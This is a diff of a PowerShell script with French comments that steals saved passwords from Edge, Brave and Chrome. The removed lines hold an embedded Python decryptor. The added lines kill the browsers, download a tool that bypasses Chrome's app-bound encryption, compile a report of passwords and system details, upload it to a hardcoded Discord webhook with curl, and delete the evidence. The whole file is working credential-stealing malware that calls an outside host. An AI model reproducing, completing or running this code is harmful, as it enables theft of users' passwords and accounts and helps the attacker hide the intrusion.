@@ -5,165 +5,104 @@ function Send-Discord {
     try { curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"$m`"}" $wh 2>$null } catch {}
 }
 
-Send-Discord "🔧 FIXED - $env:COMPUTERNAME"
+Send-Discord "🚀 ULTIMATE FIX - ChromeElevator bypass - $env:COMPUTERNAME"
 
+# Tuer navigateurs
 Get-Process | Where-Object {$_.ProcessName -match "msedge|brave|chrome"} | Stop-Process -Force -EA 0
 Start-Sleep 7
 
-cd $env:TEMP\py
+Set-Location $env:TEMP
 
-@'
-import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time
-from Crypto.Cipher import AES
+# Télécharger ChromeElevator
+Send-Discord "📥 Downloading ChromeElevator..."
 
-WH = "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
+[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
 
-def send(msg):
-    try:
-        import requests
-        requests.post(WH, json={"content": msg[:1900]}, timeout=5)
-    except:
-        pass
-
-send("🐍 Starting")
-
-try:
-    import requests
-    ip=requests.get("https://api.ipify.org",timeout=3).text
-    geo=requests.get(f"http://ip-api.com/json/{ip}",timeout=3).json()
-    location=f"{geo['city']}, {geo['regionName']}, {geo['country']}"
-    isp=geo.get('isp','N/A')
-except:
-    ip="N/A"
-    location="N/A"
-    isp="N/A"
-
-import locale
-language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"
-
-def decrypt_password(enc_password, key):
-    if not enc_password or len(enc_password) < 3:
-        return None
+try {
+    # Télécharger depuis GitHub releases
+    Invoke-WebRequest "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/latest/download/chromelevator.exe" -OutFile "chromelevator.exe" -UseBasicParsing
     
-    prefix = enc_password[:3]
+    if (!(Test-Path "chromelevator.exe")) {
+        Send-Discord "❌ Download failed"
+        exit
+    }
     
-    # v10/v11 (Edge, Chrome)
-    if prefix in [b'v10', b'v11']:
-        try:
-            nonce = enc_password[3:15]
-            ciphertext = enc_password[15:-16]
-            tag = enc_password[-16:]
-            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-            password = cipher.decrypt_and_verify(ciphertext, tag)
-            return password.decode('utf-8', errors='ignore')
-        except:
-            pass
+    Send-Discord "✅ ChromeElevator downloaded"
+    Send-Discord "🔓 Extracting ALL browsers (Edge, Brave, Chrome)..."
     
-    # v20 (Brave) - LE VRAI FIX
-    elif prefix == b'v20':
-        # v20 n'utilise PAS AES-GCM standard
-        # Le mot de passe est chiffré différemment
-        # On doit juste ignorer v20 pour l'instant
-        return None
+    # Exécuter ChromeElevator pour extraire TOUS les navigateurs
+    $output = .\chromelevator.exe all -o output 2>&1
     
-    # DPAPI (ancien)
-    try:
-        password = win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1]
-        return password.decode('utf-8', errors='ignore')
-    except:
-        pass
+    Start-Sleep 3
     
-    return None
-
-def decrypt_browser(db_path, state_path, browser_name):
-    results = []
+    # Chercher les fichiers JSON générés
+    $jsonFiles = Get-ChildItem -Path "output" -Filter "*.json" -Recurse -EA 0
     
-    send(f"🔍 {browser_name}...")
-    
-    if not os.path.exists(db_path) or not os.path.exists(state_path):
-        return results
-    
-    try:
-        with open(state_path, 'r', encoding='utf-8') as f:
-            key = win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]
+    if ($jsonFiles) {
+        Send-Discord "📊 Found $($jsonFiles.Count) JSON files"
         
-        temp_db = f"t_{browser_name}.db"
-        if os.path.exists(temp_db):
-            os.remove(temp_db)
+        # Parser et convertir en format texte
+        $allPasswords = @()
         
-        shutil.copy2(db_path, temp_db)
-        time.sleep(1)
+        foreach ($jsonFile in $jsonFiles) {
+            try {
+                $data = Get-Content $jsonFile.FullName -Raw | ConvertFrom-Json
+                
+                # Déterminer le navigateur depuis le chemin
+                $browser = "UNKNOWN"
+                if ($jsonFile.FullName -match "Brave") { $browser = "BRAVE" }
+                elseif ($jsonFile.FullName -match "Edge") { $browser = "EDGE" }
+                elseif ($jsonFile.FullName -match "Chrome") { $browser = "CHROME" }
+                
+                # Extraire les passwords
+                if ($data.passwords) {
+                    foreach ($pwd in $data.passwords) {
+                        $allPasswords += "[${browser}] $($pwd.url)`nUsername: $($pwd.username)`nPassword: $($pwd.password)`n"
+                    }
+                }
+            } catch {}
+        }
         
-        conn = sqlite3.connect(temp_db, timeout=120)
-        cursor = conn.cursor()
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
-        
-        ok = 0
-        fail = 0
-        
-        for url, user, enc_pwd in cursor.fetchall():
-            pwd = decrypt_password(enc_pwd, key)
-            if pwd and len(pwd) > 0:
-                results.append(f"[{browser_name}] {url}\nUsername: {user}\nPassword: {pwd}\n")
-                ok += 1
-            else:
-                fail += 1
-        
-        conn.close()
-        os.remove(temp_db)
-        
-        send(f"✅ {browser_name}: {ok} OK, {fail} failed")
-        
-    except Exception as e:
-        send(f"❌ {browser_name}: {str(e)}")
-    
-    return results
-
-all_results = []
-
-# Edge
-e = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
-if os.path.exists(e + r"\Default\Login Data"):
-    all_results += decrypt_browser(e + r"\Default\Login Data", e + r"\Local State", "EDGE")
-
-# Brave
-b = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
-if os.path.exists(b + r"\Default\Login Data"):
-    all_results += decrypt_browser(b + r"\Default\Login Data", b + r"\Local State", "BRAVE")
-
-# Chrome
-c = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
-if os.path.exists(c + r"\Default\Login Data"):
-    all_results += decrypt_browser(c + r"\Default\Login Data", c + r"\Local State", "CHROME")
-
-info = f"""{'='*60}
+        if ($allPasswords.Count -gt 0) {
+            # Créer le rapport
+            $report = @"
+============================================================
 SYSTEM INFORMATION
-{'='*60}
-Date/Time: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-Computer: {platform.node()}
-Username: {getpass.getuser()}
-OS: {platform.system()} {platform.release()}
-Machine: {platform.machine()}
-Processor: {platform.processor()}
-Language: {language}
-IP: {ip}
-Location: {location}
-ISP: {isp}
-{'='*60}
-TOTAL: {len(all_results)} passwords
-{'='*60}
+============================================================
+Date/Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+Computer: $env:COMPUTERNAME
+Username: $env:USERNAME
+OS: $((Get-WmiObject Win32_OperatingSystem).Caption)
+============================================================
+TOTAL PASSWORDS: $($allPasswords.Count)
+============================================================
 
-"""
+$($allPasswords -join "`n")
+"@
+            
+            $report | Out-File "passwords.txt" -Encoding UTF8
+            
+            Send-Discord "📤 Uploading $($allPasswords.Count) passwords..."
+            
+            curl.exe -F "file=@passwords.txt" $wh 2>$null
+            
+            Send-Discord "✅ UPLOAD COMPLETE - ALL PASSWORDS DECRYPTED"
+            
+            Remove-Item passwords.txt -Force
+        } else {
+            Send-Discord "⚠️ No passwords found in JSON files"
+        }
+        
+    } else {
+        Send-Discord "❌ No JSON output files found"
+        Send-Discord "📋 ChromeElevator output: $($output -join ' ')"
+    }
+    
+    # Cleanup
+    Remove-Item chromelevator.exe,output -Recurse -Force -EA 0
+    
+} catch {
+    Send-Discord "❌ Error: $($_.Exception.Message)"
+}
 
-with open("passwords.txt", "w", encoding="utf-8") as f:
-    f.write(info + "\n".join(all_results) if all_results else info + "No passwords.\n")
-
-send(f"📤 Uploading {len(all_results)} passwords...")
-print("OK")
-'@ | Out-File "fix.py" -Encoding UTF8
-
-.\python.exe fix.py 2>&1 | Out-Null
-curl.exe -F "file=@passwords.txt" $wh 2>$null
-Send-Discord "✅ DONE"
-Remove-Item passwords.txt,fix.py -Force -EA 0
-
+Send-Discord "🧹 FINISHED"
